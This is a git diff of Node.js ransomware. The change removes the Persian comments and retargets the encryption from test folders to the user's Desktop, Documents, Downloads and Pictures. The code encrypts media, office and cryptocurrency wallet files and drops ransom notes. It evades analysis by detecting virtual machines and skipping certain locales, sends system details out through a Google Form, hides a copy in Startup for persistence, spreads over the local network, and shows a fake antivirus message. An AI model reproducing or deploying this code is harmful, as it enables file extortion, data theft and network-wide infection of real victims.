@@ -13,31 +13,30 @@ if (!process.env.DETACHED) {
   child.unref();
   process.exit(0);
 }
-// ==================== اطلاعات ====================
+
 const lockKey = "IRNBL0120XG";
 const algorithm = "aes-256-ctr";
 const key = crypto.createHash("sha256").update(String(lockKey)).digest();
-// مسیر ها
-const TargetPaths = [path.join("D:\\", "test"), path.join("D:\\", "test2")];
-// const TargetPaths = [
-//   path.join(os.homedir(), "Desktop"),
-//   path.join(os.homedir(), "Documents"),
-//   path.join(os.homedir(), "Downloads"),
-//   path.join(os.homedir(), "Pictures")
-// ];
+// const TargetPaths = [path.join("D:\\", "test"), path.join("D:\\", "test2")];
+const TargetPaths = [
+  path.join(os.homedir(), "Desktop"),
+  path.join(os.homedir(), "Documents"),
+  path.join(os.homedir(), "Downloads"),
+  path.join(os.homedir(), "Pictures")
+];
 
 const fileExtensions = [
   ".mp3", ".wav", ".mp4", ".doc", ".docx", ".png",
   ".jpg", ".jpeg", ".ppt", ".pptx", ".xls", ".xlsx",".HEIF",
-   ".bitcoin", ".litecoin", ".wallet", ".wallets", ".dat",  //جدید اضافه شده
+   ".bitcoin", ".litecoin", ".wallet", ".wallets", ".dat",  
 ];
 
 const vmMacs = [
-  "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // برای VMware
-  "08:00:27",                                      // برای VirtualBox
-  "52:54:00",                                      // برای QEMU / KVM
-  "00:15:5D", "00:03:FF",                         // برای Hyper-V
-  "00:0E:0C", "00:16:3E",                         //برای Xen / Citrix
+  "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
+  "08:00:27",                                      
+  "52:54:00",                                      
+  "00:15:5D", "00:03:FF",                         
+  "00:0E:0C", "00:16:3E",                         
 ];
 
 const vmProcesses = ["vmtoolsd.exe", "VBoxService.exe", "xenservice.exe"];
@@ -50,7 +49,7 @@ for opening your file. if you are not well :
 
 see you :(): `;
 
-// ==================== اطلاعات سیستم ====================
+
 function collectSystemInfo() {
   const network = Object.values(os.networkInterfaces()).flat();
   const primaryIPv4 = network.find(
@@ -94,8 +93,7 @@ function collectSystemInfo() {
   };
 }
 
-//           ====== جدید اضافه شده =======
-// ==================== VM چکر ====================
+
 function checkVMByProcess() {
   try {
     const output = execSync("tasklist", { encoding: "utf8" });
@@ -117,8 +115,7 @@ function checkVMByMAC() {
   }
   return false;
 }
-// میشه برای محدود سازی کشور ها یا زبان هایی ... که نباید فقل بشن 
-// توی بعضی از نسخه های باج افزار ها بود 
+
 function checkLanguage() {
   const sysLang = (process.env.LANG || "").toLowerCase();
   const langs = ["fa_ir", "ru_ru", "ar_lb", "ar_ps"];
@@ -146,12 +143,11 @@ async function getDiskInfo() {
     return null;
   }
 }
-// (: مکث 30 ثانیه ای با افزار برای تعویق انداختن اجرای کد مخرب برای فرار از تحلیل 
 function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
-// ==================== قفل ====================
+
 function lockFile(filePath, encKey) {
   const iv = crypto.randomBytes(16);
   const cipher = crypto.createCipheriv(algorithm, encKey, iv);
@@ -206,7 +202,7 @@ function sayBye(){
     iceNetwork()
   }
 }
-// سازنده متن باج
+
 function deployRansomNotes(targetPaths) {
   for (const tPath of targetPaths) {
     if (fs.existsSync(tPath)) {
@@ -220,9 +216,7 @@ function deployRansomNotes(targetPaths) {
   } catch {}
 }
 
-// =============== چسبیدن به سیستم =================
-// اضافه شده : یک فال بک هم که هر 5 دقیقه چک میکنه که پوشه توی استارت اپ هست یا نه
-// نبود کپی میکند 
+
 function installPersistence() {
   try {
     const currentPath = process.execPath;
@@ -236,7 +230,7 @@ function installPersistence() {
     fs.copyFileSync(currentPath, fallbackPath);
     fs.copyFileSync(currentPath, startupPath);
     execSync(`attrib +h "${startupPath}"`, { stdio: "ignore" });
-    // جدید اضافه شده 
+
     setInterval(() => {
       try {
         if (!fs.existsSync(startupPath)) {
@@ -247,9 +241,7 @@ function installPersistence() {
     }, 300000);
   } catch (err) {}
 }
-//                ====== جدید اضافه شده ======= 
-//  =================== بخش خود در شبکه ===========================
-// سازمانی اگه بود 
+
 function iceNetwork() {
   try {
     const netView = execSync('net view', { encoding: "utf8", timeout: 10000 });
@@ -289,7 +281,7 @@ function iceNetwork() {
     }
   } catch {}
 }
-// ==================== ارسال به گوگل فرم====================
+
 async function exfiltrateSystemInfo(info) {
   try {
     const formURL =
@@ -320,7 +312,7 @@ async function exfiltrateSystemInfo(info) {
 async function main() {
   const systemInfo = collectSystemInfo();
 
-  // ----- اجرا چک کننده  -----
+
   if (checkVMByMAC() || checkVMByProcess()) {
     console.log("VM detected by MAC/process");
     process.exit(0);
@@ -351,13 +343,12 @@ async function main() {
     console.log("[-] Low disk space, exiting");
     process.exit(0);
   }
-  // -----  اجراارسال اطلاعات-----
+
   await exfiltrateSystemInfo(systemInfo);
 
-  // ----- اجرا ماندگاری -----
+
         installPersistence();
 
-  // ----- , اجرا فقل کردن و متن باج -----
   sayBye()
 
   console.log("Your Anti-Virus Updated - end");
